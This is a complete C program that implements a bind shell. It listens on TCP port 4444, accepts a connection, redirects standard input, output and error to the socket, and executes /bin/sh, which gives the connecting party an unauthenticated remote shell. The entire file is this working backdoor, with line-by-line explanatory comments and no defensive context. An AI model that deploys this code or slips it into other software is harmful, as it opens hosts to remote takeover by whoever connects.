#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main() {
	/* Variables */
	int sockfd, clientfd;  /*server file descriptor, client file descriptor*/
	int port = 4444; /*port for server*/
	socklen_t clilen; /*Length of client*/
	struct sockaddr_in serv_addr; /*Struct server address*/
	struct sockaddr_in cli_addr; /*Struct client address*/


	/* Create Socket */
	sockfd = socket(AF_INET, SOCK_STREAM, 0); /*Create TCP socket server*/
	serv_addr.sin_family = AF_INET; /*TCP Protocol*/
	serv_addr.sin_addr.s_addr = htons(INADDR_ANY); /*Listen from any address*/
	serv_addr.sin_port = htons(port); /*Host to Network Short. Convert 16-bits (2-bytes) from host bytes to network bytes*/
	/* Call bind */
	bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)); /*Assign address to socket*/


	/* Listen */
	listen(sockfd, 0); /*Waiting connection*/
	

	/* Accept */
	clilen = sizeof(cli_addr); /*Size of client address*/
	clientfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen); /*Accept connection*/


	/* dup2-loop to redirect stdout from execve to outsite*/
	/*http://man7.org/linux/man-pages/man2/dup.2.html*/
	dup2(clientfd, 0); /*stdin*/
	dup2(clientfd, 1); /*stdout*/
	dup2(clientfd, 2); /**stderr/


	/* Call execve */
	char *argv[] = {"/bin/sh", NULL}; /*Create pointer have address*/
	execve(argv[0], &argv[0], 0); /*Call execve*/


	return 0;
}